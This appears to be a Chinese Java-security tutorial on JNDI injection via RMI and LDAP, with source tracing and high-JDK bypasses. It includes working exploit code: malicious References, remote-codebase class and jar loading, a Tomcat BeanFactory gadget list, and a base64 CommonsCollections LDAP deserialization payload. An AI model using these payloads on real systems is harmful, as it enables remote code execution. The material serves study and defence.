<p>JNDIRMIServer，运用JNDI封装的方法去rebind</p>
<pre><code>public class JNDIRMIServer &#123;

    public static void main(String[] args) throws Exception &#123;

        InitialContext initialContext = new InitialContext();

        Reference reference = new Reference(&quot;Calc&quot;, &quot;Calc&quot;, &quot;http://localhost:7777/&quot;);

        initialContext.rebind(&quot;rmi://localhost:1099/remote&quot;,reference);

    &#125;
&#125;
</code></pre>
<p>HTTP 端恶意载荷（Calc.java）代码，由Reference引用</p>
<pre><code>public class Calc &#123;

    public Calc() throws Exception &#123;
        Runtime.getRuntime().exec(&quot;calc&quot;);
    &#125;
    
&#125;
</code></pre>
<p>JNDIRMICilent，受害者客户端</p>
<pre><code>public class JNDIRMICilent &#123;

    public static void main(String[] args) throws Exception &#123;

        InitialContext initialContext = new InitialContext();

        RemoteInterface remote = (RemoteInterface)initialContext.lookup(&quot;rmi://localhost:1099/remote&quot;);

        System.out.println(remote.sayHello(&quot;OK&quot;));
    &#125;
&#125;
</code></pre>
<p>运行顺序：RMIServer-&gt;JNDIRMIServer-&gt;http.server-&gt;JNDIRMICilent</p>
<p><img src="/images/20230501224001.png"></p>
<h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>跟进InitialContext#lookup(java.lang.String)，会调用GenericURLContext#lookup(java.lang.String)</p>
<p><img src="/images/20230501224809.png"></p>
<p>GenericURLContext#lookup(java.lang.String)会调用RegistryContext#lookup(javax.naming.Name)，不同的协议有不同的xxxContext</p>
<p><img src="/images/20230501224915.png"></p>
<p>RegistryContext#lookup底层还是调用rmi原生的RegistryImpl_Stub#lookup，获取到ReferenceWrapper对象，去decodeObject</p>
<p><img src="/images/20230501225123.png"></p>
<p>com.sun.jndi.rmi.registry.RegistryContext#decodeObject先获取到Wapper中的Reference，然后调用NamingManager#getObjectInstance，这时已经走出rmi协议的逻辑，来到通用的类加载逻辑，说明类加载和rmi协议无关，可能存在两个攻击面</p>
<p><img src="/images/20230501225715.png"></p>
<p>NamingManager#getObjectInstance重要的是会调用NamingManager#getObjectFactoryFromReference，从Reference中获取对象工厂</p>
<p><img src="/images/20230501230233.png"></p>
<p>首先会从本地找，本地没找到，然后通过codebase找，进入VersionHelper#loadClass(java.lang.String, java.lang.String)</p>
<p><img src="/images/20230501230454.png"></p>
<p>VersionHelper#loadClass(java.lang.String, java.lang.String)：</p>
<p><img src="/images/20230501230647.png"></p>
<p>com.sun.naming.internal.VersionHelper12#loadClass(java.lang.String, java.lang.ClassLoader)，这里就会去从URLClassPath下去找Calc类，这时initialize为true，表示初始化加载，如果恶意代码写在静态代码块的话就会被执行，我们是写在构造器，没有执行</p>
<p><img src="/images/20230501230833.png"></p>
<p>return返回回到NamingManager#getObjectFactoryFromReference，clas.newInstance进行实例化，弹出Calc</p>
<p><img src="/images/20230501231239.png"></p>
<p>总结攻击面：</p>
<ol>
<li>RegistryContext中会调用原生RMI中的方法</li>
<li>NamingManager中的类加载</li>
</ol>
<h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h3><p>在jdk8u113以上后，rmi协议因为trustURLCodebase默认为false后无法利用，但是可以利用LDAP协议</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>ComLDAPServer，创建一个普通的ldap服务ComLDAPServer</p>
<pre><code>public class ComLDAPServer &#123;
    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
    public static void main(String[] args) throws IOException &#123;
        int port = 1234;
        try &#123;
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    &quot;listen&quot;, //$NON-NLS-1$
                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.setSchema(null);
            config.setEnforceAttributeSyntaxCompliance(false);
            config.setEnforceSingleStructuralObjectClass(false);
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            ds.add(&quot;dn: &quot; + &quot;dc=example,dc=com&quot;, &quot;objectClass: top&quot;, &quot;objectclass: domain&quot;);


            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$
            ds.startListening();

        &#125; catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
</code></pre>
<p>JNDILDAPServer，用JNDI rebind，将恶意的引用绑定上去</p>
<pre><code>public class JNDILDAPServer &#123;

    public static void main(String[] args) throws Exception &#123;

        InitialContext initialContext = new InitialContext();

        Reference reference = new Reference(&quot;Calc&quot;, &quot;Calc&quot;, &quot;http://localhost:7777/&quot;);

        initialContext.rebind(&quot;ldap://localhost:1234/cn=test,dc=example,dc=com&quot;,reference);
    &#125;
&#125;
</code></pre>
<p>HTTP 端恶意载荷（Calc.java）代码，由Reference引用</p>
<pre><code>public class Calc &#123;

    public Calc() throws Exception &#123;
        Runtime.getRuntime().exec(&quot;calc&quot;);
    &#125;
    
&#125;
</code></pre>
<p>LDAPClient，受害者客户端</p>
<pre><code>public class LDAPClient &#123;
    public static void main(String[] args) throws NamingException&#123;
        String url = &quot;ldap://localhost:1234/cn=test,dc=example,dc=com&quot;;
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(url);
    &#125;

&#125;
</code></pre>
<h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>InitialContext#lookup中会调用对应协议xxxContext的方法,来到<code>ldapURLContext#lookup</code>，调用super.lookup(var1)，后面调用一大堆lookup，我们看一下方法栈，来到核心LdapCtx#c_lookup</p>
<p><img src="/images/20230502000820.png"></p>
<p>lookup 获取Entry后，一路传参 到c_lookup，在doSearchOnce中发起对传入的url发起请求，获取对应的Entry，判断javaclassname、javaNamingReference不为空的时候进行decodeObject处理，进行解析，attrs里可以看到我们的cn:test</p>
<p><img src="/images/20230502001916.png"></p>
<p>deocodeOject会进行判断，不同类型的对象调用不同的方法，我们是个引用，所以会调用decodeReference方法</p>
<p><img src="/images/20230502002454.png"></p>
<p>获取类名，地址，返回这个Reference对象，解析Reference完毕</p>
<p><img src="/images/20230502002631.png"></p>
<p>返回到LdapCtx#c_lookup，对这个Reference进行查找，调用DirectoryManager.getObjectInstance</p>
<blockquote>
<p>注意这个DirectoryManager,JNDI分为了Naming和Directory，对应的命名服务和目录服务,而RMI调用的NamingManager，这里就是个体现</p>
</blockquote>
<p><img src="/images/20230502003130.png"></p>
<p>DirectoryManager也是调用getObjectFactoryFromReference，和NamingManager如出一辙，后面逻辑都一样，这里就不再追了。</p>
<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>javax.naming.spi.NamingManager#getObjectFactoryFromReference从codebase中加载类时调用VersionHelper#loadClass</p>
<p><img src="/images/20230502005335.png"></p>
<p>com.sun.naming.internal.VersionHelper12#loadClass(java.lang.String, java.lang.String)高版本中会判断trustURLCodebase是否为true</p>
<p><img src="/images/20230502005218.png"></p>
<h2 id="高版本绕过"><a href="#高版本绕过" class="headerlink" title="高版本绕过"></a>高版本绕过</h2><h3 id="Tomcat-Embed-Core依赖加载本地BeanFactory绕过"><a href="#Tomcat-Embed-Core依赖加载本地BeanFactory绕过" class="headerlink" title="Tomcat Embed Core依赖加载本地BeanFactory绕过"></a>Tomcat Embed Core依赖加载本地BeanFactory绕过</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Tomcat Embed Core作为一个常用的依赖它的BeanFactory中的getObjectInstance方法提供了一个不安全的反射调用，并且参数可控，导致可以利用</p>
<pre><code>public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                Hashtable&lt;?,?&gt; environment)
    throws NamingException &#123;

    if (obj instanceof ResourceRef) &#123; // 判断obj对象是否是ResourceRef

        try &#123;

            Reference ref = (Reference) obj;
            String beanClassName = ref.getClassName(); // 获取ref中className属性
            Class&lt;?&gt; beanClass = null;
            ClassLoader tcl = Thread.currentThread().getContextClassLoader();
            if (tcl != null) &#123;
                try &#123;
                    beanClass = tcl.loadClass(beanClassName);
                &#125; catch(ClassNotFoundException e) &#123;
                &#125;
            &#125; else &#123;
                try &#123;
                    beanClass = Class.forName(beanClassName);  // 本地加载对应的Class对象
                &#125; catch(ClassNotFoundException e) &#123;
                    e.printStackTrace();
                &#125;
            &#125;
            if (beanClass == null) &#123;
                throw new NamingException
                    (&quot;Class not found: &quot; + beanClassName);
            &#125;

            BeanInfo bi = Introspector.getBeanInfo(beanClass);  // 获取相关Class的信息
            PropertyDescriptor[] pda = bi.getPropertyDescriptors(); // 获取相关参数

            Object bean = beanClass.newInstance(); // 实例化对应的className，获得一个对象，那么我们利用的类有个前提条件就是该beanClass对象存在一个公有的无参构造函数

            /* Look for properties with explicitly configured setter */
            RefAddr ra = ref.get(&quot;forceString&quot;); // 获取forceString字符串
            Map&lt;String, Method&gt; forced = new HashMap&lt;&gt;();
            String value;

            if (ra != null) &#123;
                value = (String)ra.getContent(); // 获取forceString中的值
                Class&lt;?&gt; paramTypes[] = new Class[1]; // 存储下面的String.class，那么我们利用的类有个前提条件，对应方法的第一个参数为String类型
                paramTypes[0] = String.class;
                String setterName;
                int index;

                /* Items are given as comma separated list */
                for (String param: value.split(&quot;,&quot;)) &#123;  // 通过“，”来进行切分
                    param = param.trim();
                    /* A single item can either be of the form name=method
                     * or just a property name (and we will use a standard
                     * setter) */
                    index = param.indexOf(&#39;=&#39;); // 如果param中有“=”符号的话
                    if (index &gt;= 0) &#123;
                        setterName = param.substring(index + 1).trim(); // setterName=eval
                        param = param.substring(0, index).trim(); // param=KINGX
                    &#125; else &#123;
                        setterName = &quot;set&quot; + param.substring(0, 1).toUpperCase(Locale.ENGLISH) +
                                     param.substring(1);
                    &#125;
                    try &#123;
                        forced.put(param, beanClass.getMethod(setterName, paramTypes));  // KINGS=eval（方法）
                    &#125; catch (NoSuchMethodException|SecurityException ex) &#123;
                        throw new NamingException
                            (&quot;Forced String setter &quot; + setterName +
                             &quot; not found for property &quot; + param);
                    &#125;
                &#125;
            &#125;

            Enumeration&lt;RefAddr&gt; e = ref.getAll(); // 获取ref中所有的字符串

            while (e.hasMoreElements()) &#123;

                ra = e.nextElement();
                String propName = ra.getType();

                if (propName.equals(Constants.FACTORY) ||
                    propName.equals(&quot;scope&quot;) || propName.equals(&quot;auth&quot;) ||
                    propName.equals(&quot;forceString&quot;) ||
                    propName.equals(&quot;singleton&quot;)) &#123;
                    continue;
                &#125;

                value = (String)ra.getContent();

                Object[] valueArray = new Object[1];

                /* Shortcut for properties with explicitly configured setter */
                Method method = forced.get(propName); // 获取到eval（方法）
                if (method != null) &#123;
                    valueArray[0] = value;  // value也是我们可控的，此时value则是执行命令的字符串
                    try &#123;
                        method.invoke(bean, valueArray); // 最终执行命令即可触发
                    &#125; catch (IllegalAccessException|
                             IllegalArgumentException|
                             InvocationTargetException ex) &#123;
                        throw new NamingException
                            (&quot;Forced String setter &quot; + method.getName() +
                             &quot; threw exception for property &quot; + propName);
                    &#125;
                    continue;
                &#125;
            ....    
            ....

&#125;
</code></pre>
<p><img src="/images/20230502010730.png"></p>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>TomcatBeanFactoryBypass</p>
<pre><code>public class TomcatBeanFactoryBypass &#123;
    public static void main(String[] args) throws Exception &#123;
        InitialContext initialContext = new InitialContext();
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);

        // 强制将 &#39;x&#39; 属性的setter 从 &#39;x&#39; 变为 &#39;eval&#39;, 详细逻辑见 BeanFactory.getObjectInstance 代码
        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));

        // 指定x属性指定其setter方法需要的参数，实际是ElProcessor.eval方法执行的参数，利用表达式执行命令
        ref.add(new StringRefAddr(&quot;x&quot;, &quot;Runtime.getRuntime().exec(&#39;calc&#39;)&quot;));

        initialContext.rebind(&quot;rmi://localhost:1099/remote&quot;, ref);  // 绑定目录名
    &#125;
&#125;
</code></pre>
<h4 id="常用的利用类"><a href="#常用的利用类" class="headerlink" title="常用的利用类"></a>常用的利用类</h4><h5 id="groovy-lang-GroovyShell-evaluate"><a href="#groovy-lang-GroovyShell-evaluate" class="headerlink" title="groovy.lang.GroovyShell#evaluate"></a>groovy.lang.GroovyShell#evaluate</h5><pre><code>ResourceRef ref = new ResourceRef(&quot;groovy.lang.GroovyShell&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);
ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=evaluate&quot;));
ref.add(new StringRefAddr(&quot;x&quot;, &quot;&#39;calc&#39;.execute()&quot;));
</code></pre>
<h5 id="javax-management-loading-MLet"><a href="#javax-management-loading-MLet" class="headerlink" title="javax.management.loading.MLet"></a>javax.management.loading.MLet</h5><pre><code>private static ResourceRef tomcatMLet() &#123;
    ResourceRef ref = new ResourceRef(&quot;javax.management.loading.MLet&quot;, null, &quot;&quot;, &quot;&quot;,
            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=loadClass,b=addURL,c=loadClass&quot;));
    ref.add(new StringRefAddr(&quot;a&quot;, &quot;javax.el.ELProcessor&quot;));
    ref.add(new StringRefAddr(&quot;b&quot;, &quot;http://127.0.0.1:2333/&quot;));
    ref.add(new StringRefAddr(&quot;c&quot;, &quot;Blue&quot;));
    return ref;
&#125;
</code></pre>
<h5 id="GroovyClassLoader"><a href="#GroovyClassLoader" class="headerlink" title="GroovyClassLoader"></a>GroovyClassLoader</h5><pre><code>private static ResourceRef tomcatGroovyClassLoader() &#123;
    ResourceRef ref = new ResourceRef(&quot;groovy.lang.GroovyClassLoader&quot;, null, &quot;&quot;, &quot;&quot;,
            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=addClasspath,b=loadClass&quot;));
    ref.add(new StringRefAddr(&quot;a&quot;, &quot;http://127.0.0.1:8888/&quot;));
    ref.add(new StringRefAddr(&quot;b&quot;, &quot;blue&quot;));
    return ref;
&#125;
</code></pre>
<h5 id="SnakeYaml"><a href="#SnakeYaml" class="headerlink" title="SnakeYaml"></a>SnakeYaml</h5><pre><code>private static ResourceRef tomcat_snakeyaml()&#123;
    ResourceRef ref = new ResourceRef(&quot;org.yaml.snakeyaml.Yaml&quot;, null, &quot;&quot;, &quot;&quot;,
            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
    String yaml = &quot;!!javax.script.ScriptEngineManager [\n&quot; +
            &quot;  !!java.net.URLClassLoader [[\n&quot; +
            &quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/exp.jar\&quot;]\n&quot; +
            &quot;  ]]\n&quot; +
            &quot;]&quot;;
    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=load&quot;));
    ref.add(new StringRefAddr(&quot;a&quot;, yaml));
    return ref;
&#125;
</code></pre>
<h5 id="XStream"><a href="#XStream" class="headerlink" title="XStream"></a>XStream</h5><pre><code>private static ResourceRef tomcat_xstream()&#123;
    ResourceRef ref = new ResourceRef(&quot;com.thoughtworks.xstream.XStream&quot;, null, &quot;&quot;, &quot;&quot;,
            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
    String xml = &quot;&lt;java.util.PriorityQueue serialization=&#39;custom&#39;&gt;\n&quot; +
            &quot;  &lt;unserializable-parents/&gt;\n&quot; +
            &quot;  &lt;java.util.PriorityQueue&gt;\n&quot; +
            &quot;    &lt;default&gt;\n&quot; +
            &quot;      &lt;size&gt;2&lt;/size&gt;\n&quot; +
            &quot;    &lt;/default&gt;\n&quot; +
            &quot;    &lt;int&gt;3&lt;/int&gt;\n&quot; +
            &quot;    &lt;dynamic-proxy&gt;\n&quot; +
            &quot;      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot; +
            &quot;      &lt;handler class=&#39;sun.tracing.NullProvider&#39;&gt;\n&quot; +
            &quot;        &lt;active&gt;true&lt;/active&gt;\n&quot; +
            &quot;        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;\n&quot; +
            &quot;        &lt;probes&gt;\n&quot; +
            &quot;          &lt;entry&gt;\n&quot; +
            &quot;            &lt;method&gt;\n&quot; +
            &quot;              &lt;class&gt;java.lang.Comparable&lt;/class&gt;\n&quot; +
            &quot;              &lt;name&gt;compareTo&lt;/name&gt;\n&quot; +
            &quot;              &lt;parameter-types&gt;\n&quot; +
            &quot;                &lt;class&gt;java.lang.Object&lt;/class&gt;\n&quot; +
            &quot;              &lt;/parameter-types&gt;\n&quot; +
            &quot;            &lt;/method&gt;\n&quot; +
            &quot;            &lt;sun.tracing.dtrace.DTraceProbe&gt;\n&quot; +
            &quot;              &lt;proxy class=&#39;java.lang.Runtime&#39;/&gt;\n&quot; +
            &quot;              &lt;implementing__method&gt;\n&quot; +
            &quot;                &lt;class&gt;java.lang.Runtime&lt;/class&gt;\n&quot; +
            &quot;                &lt;name&gt;exec&lt;/name&gt;\n&quot; +
            &quot;                &lt;parameter-types&gt;\n&quot; +
            &quot;                  &lt;class&gt;java.lang.String&lt;/class&gt;\n&quot; +
            &quot;                &lt;/parameter-types&gt;\n&quot; +
            &quot;              &lt;/implementing__method&gt;\n&quot; +
            &quot;            &lt;/sun.tracing.dtrace.DTraceProbe&gt;\n&quot; +
            &quot;          &lt;/entry&gt;\n&quot; +
            &quot;        &lt;/probes&gt;\n&quot; +
            &quot;      &lt;/handler&gt;\n&quot; +
            &quot;    &lt;/dynamic-proxy&gt;\n&quot; +
            &quot;    &lt;string&gt;/System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;\n&quot; +
            &quot;  &lt;/java.util.PriorityQueue&gt;\n&quot; +
            &quot;&lt;/java.util.PriorityQueue&gt;&quot;;
    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=fromXML&quot;));
    ref.add(new StringRefAddr(&quot;a&quot;, xml));
    return ref;
&#125;
</code></pre>
<h5 id="MVEL"><a href="#MVEL" class="headerlink" title="MVEL"></a>MVEL</h5><pre><code>private static ResourceRef tomcat_MVEL()&#123;
    ResourceRef ref = new ResourceRef(&quot;org.mvel2.sh.ShellSession&quot;, null, &quot;&quot;, &quot;&quot;,
            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=exec&quot;));
    ref.add(new StringRefAddr(&quot;a&quot;,
            &quot;push Runtime.getRuntime().exec(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;));
    return ref;
&#125;
</code></pre>
<h5 id="NativeLibLoader"><a href="#NativeLibLoader" class="headerlink" title="NativeLibLoader"></a>NativeLibLoader</h5><pre><code>private static ResourceRef tomcat_loadLibrary()&#123;
    ResourceRef ref = new ResourceRef(&quot;com.sun.glass.utils.NativeLibLoader&quot;, null, &quot;&quot;, &quot;&quot;,
            true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
    ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=loadLibrary&quot;));
    ref.add(new StringRefAddr(&quot;a&quot;, &quot;/../../../../../../../../../../../../tmp/libcmd&quot;));
    return ref;
&#125;
</code></pre>
<h3 id="LDAP反序列化绕过"><a href="#LDAP反序列化绕过" class="headerlink" title="LDAP反序列化绕过"></a>LDAP反序列化绕过</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>来到解析Reference相同的地方Obj#decodeObject，判断如果是序列化数据就会调用deserializeObject</p>
<p><img src="/images/20230502170832.png"></p>
<p>deserializeObject中触发反序列化</p>
<p><img src="/images/20230502171123.png"></p>
<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><p>LDAPServerBypass：</p>
<pre><code>public class LDAPServerBypass &#123;
    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;


    public static void main (String[] args) &#123;

        int port = 1234;


        try &#123;
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    &quot;listen&quot;,
                    InetAddress.getByName(&quot;0.0.0.0&quot;),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
            ds.startListening();

        &#125;
        catch ( Exception e ) &#123;
            e.printStackTrace();
        &#125;
    &#125;

    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try &#123;
                e.addAttribute(&quot;javaClassName&quot;, &quot;test&quot;);
                e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRv&quot; +
                        &quot;cmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznB&quot; +
                        &quot;H9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4&quot; +
                        &quot;cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSC&quot; +
                        &quot;nnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5z&quot; +
                        &quot;Zm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFp&quot; +
                        &quot;bmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUv&quot; +
                        &quot;Y29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9u&quot; +
                        &quot;cy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hl&quot; +
                        &quot;LmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGU&quot; +
                        &quot;AgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBz&quot; +
                        &quot;cgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zv&quot; +
                        &quot;cm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5h&quot; +
                        &quot;bWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNz&quot; +
                        &quot;O3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1&quot; +
                        &quot;cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsA&quot; +
                        &quot;AAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAA&quot; +
                        &quot;AnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAA&quot; +
                        &quot;AAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAA&quot; +
                        &quot;AAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdl&quot; +
                        &quot;chLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAB&quot; +
                        &quot;c3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xk&quot; +
                        &quot;eHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;));
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            &#125;
            catch ( Exception e1 ) &#123;
                e1.printStackTrace();
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化——CC链</title>
    <url>/2023/03/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94CC%E9%93%BE/</url>
    <content><![CDATA[<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><h2 id="maven依赖版本"><a href="#maven依赖版本" class="headerlink" title="maven依赖版本"></a>maven依赖版本</h2><pre><code>&lt;dependency&gt;
    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
    &lt;version&gt;3.1&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="AbstractMapDecorator"><a href="#AbstractMapDecorator" class="headerlink" title="AbstractMapDecorator"></a>AbstractMapDecorator</h3><p>CC 库中提供了一个抽象类 <code>org.apache.commons.collections.map.AbstractMapDecorator</code>，这个类是 Map 的扩展，并且从名字中可以知道，这是一个基础的装饰器，用来给 map 提供附加功能，被装饰的 map 存在该类的属性中，并且将所有的操作都转发给这个 map。</p>
<p>这个类有很多实现类，各个类触发的方式不同，重点关注的是 </p>
<ul>
<li>TransformedMap </li>
<li>LazyMap。</li>
</ul>
<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p><code>org.apache.commons.collections.map.TransformedMap</code> 类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由 Transformer 来定义，Transformer 在 TransformedMap 实例化时作为参数传入。</p>
<p><img src="/images/20230425195602.png"></p>
<p>TransformedMap 内的 key 或者 value 发生变化时，例如调用 TransformedMap 的 <code>put</code> 方法时，就会<code>put</code>方法内会调用，<code>transformKey</code>和<code>transformValue</code>， 而这两个方法内就会调用keyTransformer的 <code>transform()</code> 方法。</p>
<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>org.apache.commons.collections.map.LazyMap</code> 与 TransformedMap 类似，不过差异是调用 <code>get()</code> 方法时如果传入的 key 不存在，则会触发相应参数的 Transformer 的 <code>transform()</code> 方法。</p>
<p>与 LazyMap 具有相同功能的，是 <code>org.apache.commons.collections.map.DefaultedMap</code>，同样是 <code>get()</code> 方法会触发 transform 方法。</p>
<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p><code>org.apache.commons.collections.Transformer</code> 是一个接口，提供了一个 <code>transform()</code> 方法，用来定义具体的转换逻辑。例如<code>InvokerTransformer</code>方法接收 Object 类型的 input，处理后将 Object 返回。</p>
<p><img src="/images/20230425200030.png"></p>
<p>在 Commons Collection 3.2.1 中，程序提供了 14 个 Transformer 的实现类，用来实现不同的对 TransformedMap 中 key&#x2F;value 进行修改的功能。</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>这个实现类从 Commons Collections 3.0 引入，功能是使用反射创建一个新对象，我们来看一下它的 transfrom 方法，方法注释写的很清楚，通过调用 input 的方法，并将方法返回结果作为处理结果进行返回。</p>
<p><img src="/images/20230425200155.png"></p>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><code>org.apache.commons.collections.functors.ChainedTransformer</code> 类也是一个 Transformer的实现类，但是这个类自己维护了一个 Transformer 数组， 在调用 ChainedTransformer 的 transform 方法时，会循环数组，依次调用 Transformer 数组中每个 Transformer 的 transform 方法，并将结果传递给下一个 Transformer。</p>
<p><img src="/images/20230425200719.png"></p>
<p>这样就给了使用者链式调用多个 Transformer 分别处理对象的能力。</p>
<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p><code>org.apache.commons.collections.functors.ConstantTransformer</code> 是一个返回固定常量的 Transformer，在初始化时储存了一个 Object，后续的调用时会直接返回这个 Object。</p>
<pre><code>public Object transform(Object input) &#123;
    return iConstant;
&#125;
</code></pre>
